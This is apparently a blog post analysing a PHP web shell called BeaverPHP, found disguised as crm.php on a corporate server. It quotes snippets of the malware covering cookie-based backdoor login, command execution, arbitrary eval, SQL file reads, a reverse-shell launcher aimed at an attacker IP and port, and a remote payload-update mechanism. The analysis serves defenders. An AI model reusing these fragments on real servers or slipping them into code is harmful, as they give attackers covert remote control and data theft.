---
layout: post
category: malware
---
## introduction

during a recent security audit, an unusual php script named `crm.php` was identified on the corporate server. initially, the script didn't raise alarms due to its innocuous name, seemingly related to crm software. however, upon deeper inspection, it became clear this was not a legitimate tool but a variant of BeaverPHP, a sophisticated remote administration tool (rat) hidden within php.

### technical analysis of BeaverPHP rat:

#### 1. authentication and persistence:

the RAT authenticates using a hardcoded md5 hashed password stored within the `$admin` array:

```php
$admin=array('check'=>1, 'pass'=>'4da935e43ac3bf33c02c5d3969668004');
```

this allows persistent unauthorized access through simple cookie-based authentication (`godssid`). the session cookie enables repeated covert entry into compromised systems.

the RAT handles authentication with:

```php
if($admin['check']) {
    $password = md5($password);
    if($doing == 'login') {
        if($admin['pass'] == $password) {
            scookie('godssid', $password);
            exit;
        }
    }
    if($_COOKIE['godssid'] != $admin['pass']) loginpage();
}
```

#### 2. system and environment checks:

BeaverPHP extensively gathers server information for reconnaissance:

- server ip and hostname from `$_server` variables.
- os and php version using `php_uname()` and `phpversion()`.
- detection of disabled php functions, identifying potential restrictions for subsequent exploitation.

this is explicitly shown:

```php
$_SERVER['REMOTE_ADDR'], gethostbyname($_SERVER['SERVER_NAME']), @php_uname(), @phpversion(), ini_get('disable_functions')
```

#### 3. file management:

the RAT provides comprehensive file system control:

- create, delete, rename, copy files/directories.
- change file permissions (`chmod`) and timestamps (`touch`).
- upload/download files through http post requests.
- batch file operations including deleting multiple files or compressing files for download:

```php
elseif($doing=='delfiles') {
    foreach ($dl as $filepath => $value) {
        @unlink($filepath);
    }
}
```

#### 4. command execution:

BeaverPHP executes arbitrary system commands via php functions:

- supports `system`, `exec`, `shell_exec`, `proc_open`, and windows com interfaces.
- executes external programs (e.g., `cmd.exe`) with specified parameters, capturing their output:

```php
elseif($haz == 'sh') {
    if(IS_WIN && IS_COM) {
        $shell= new COM('Shell.Application');
        $shell->ShellExecute($program,$parameter);
    }
    echo htmlspecialchars(mycmd($ex));
}
```

#### 5. database interaction:

BeaverPHP includes advanced mysql interaction:

- executes arbitrary sql queries directly.
- performs database or table backups/downloads.
- exploits `load data local infile` to upload files to mysql databases.
- retrieves files from the server using crafted sql queries:

```php
$result = q($lnk, "select load_file('$mysqldlfile');");
```

#### 6. reverse shell (back connect):

includes scripts in perl and c for reverse shell connections to evade network security:

```php
$rv_connect (perl base64-encoded reverse shell script);
$rv_connect_c (c source code for reverse shell);
```

the RAT compiles/executes these scripts, creating remote shells to an attacker-defined ip and port:

```php
if($start && $yourip && $yourport && $use){
    sv_file('/tmp/god_bc',base64_decode($rv_connect));
    mycmd(which('perl')." /tmp/god_bc $yourip $yourport &");
}
```

#### 7. php code execution:

allows arbitrary php code execution through a direct `eval()` interface, granting total runtime control:

```php
elseif($haz=='evl') {
    eval("?".">$phpcode<?");
}
```

#### 8. update mechanism:

features an integrated update function pulling payloads from remote urls:

```php
$update_urls=array('https://raw.githubusercontent.com/<MALWARE_DEV_OWNER>/<MALWARE_DEV_REPO>/main/<FILE>.txt');
```
this allows attackers to introduce new functionalities or maintain persistence without further compromise.

i'm not releasing the source code now but i will release it any moment.

```php
elseif ($haz=='update'){
    $backup_file=trim(str_replace('.php','.bak.php',$_SERVER['SCRIPT_NAME']),'/');
    formhead(array('title'=>'Update Manager'));
    makeselect(array('title'=>'Update urls','option'=>$update_urls,'selected'=>$update_urls[0]));
}
```

#### 9. obfuscation and anti-detection techniques:

- suppresses php error reporting (`error_reporting(0)`) to avoid detection.
- uses seemingly benign file names (`crm.php`) to evade suspicion.
- employs dynamic variable assignments and cookie-based authentication to mask malicious intent.

#### 10. security implications:

the presence of BeaverPHP RAT indicates severe security compromise, granting attackers ongoing remote access, command execution, data exfiltration, and persistent surveillance capabilities. immediate remediation and further forensic analysis are critical.

